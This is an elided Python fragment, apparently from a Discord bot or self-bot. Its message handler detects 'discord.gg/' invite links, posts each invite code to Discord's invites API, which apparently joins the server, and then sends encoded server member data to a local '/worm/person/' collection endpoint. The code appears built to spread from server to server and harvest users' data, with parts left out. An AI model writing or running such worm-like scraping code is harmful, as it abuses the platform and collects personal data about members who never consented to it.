...
async def on_message(ctx):
    if "discord.gg/" in ctx.content:
        ...
        request = requests.post(f"https://discordapp.com/api/v6/invites/{invite}", headers=headers) 
        if "name" in request.text: 
            try:
                ...
                api = requests.post(f"http://127.0.0.1:8000/worm/person/", data=encode_this_please(str(data_members))) 
